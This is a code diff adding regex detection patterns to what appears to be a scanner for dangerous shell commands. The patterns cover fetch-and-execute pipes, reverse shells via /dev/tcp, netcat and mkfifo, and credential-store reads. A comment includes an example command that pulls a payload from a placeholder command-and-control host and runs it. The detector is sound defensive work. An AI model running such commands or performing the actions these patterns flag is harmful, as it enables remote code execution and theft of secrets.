@@ -36,6 +36,20 @@ _GUIDELINE = (
 # Remote content piped straight into a shell interpreter.
 _PIPE_TO_SHELL = re.compile(r"(curl|wget|fetch)\b[^\n|]*\|\s*(sh|bash|zsh|python\d?)\b", re.I)
 _SHELL_SUBSHELL_FETCH = re.compile(r"\$\((?:\s*)(curl|wget)\b", re.I)
+# Fetch-and-execute, tolerant of intermediate stages: a remote fetcher (incl. dig/
+# nslookup used as a covert channel) piped through anything into an interpreter or
+# decoder — e.g. `dig +short TXT c2.evil | base64 -d | bash`, `curl x | tee | sh`.
+_FETCH_PIPE_EXEC = re.compile(
+    r"\b(?:curl|wget|fetch|dig|nslookup|host)\b[^\n]*\|[^\n]*\b(?:sh|bash|zsh|python\d?|base64)\b",
+    re.I,
+)
+# Reverse shells: the bash /dev/tcp trick, an interactive shell redirected to a
+# socket, netcat -e, and the mkfifo|nc pattern.
+_REVERSE_SHELL = re.compile(
+    r"(?:/dev/(?:tcp|udp)/|bash\s+-i\b[^\n]*>&|\b(?:nc|ncat)\b[^\n]{0,60}\s-e\b|"
+    r"mkfifo\b[^\n]*\|\s*(?:nc|ncat)\b)",
+    re.I,
+)
 # Reads of credential stores / environment.
 _SECRET_READ = re.compile(
     r"(~/\.ssh\b|~/\.aws\b|\.env\b|/proc/\d+/environ|\bprintenv\b|"
